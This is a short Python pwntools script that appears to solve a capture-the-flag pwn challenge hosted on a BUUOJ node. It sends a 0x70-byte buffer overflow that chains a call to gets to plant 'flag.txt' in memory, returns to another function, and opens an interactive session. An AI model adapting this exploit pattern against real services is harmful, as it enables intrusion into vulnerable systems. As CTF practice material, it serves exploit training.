from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27250)
elf=ELF("./timu")

gets_plt=elf.plt["gets"]
main=0x080486F8

payload=0x70*b'a'+p32(gets_plt)+p32(0x080485CB)+p32(0x0804A060)
sh.recvuntil(b"Please input:\n")
sh.sendline(payload)
sh.sendline(b"flag.txt")

sh.interactive()
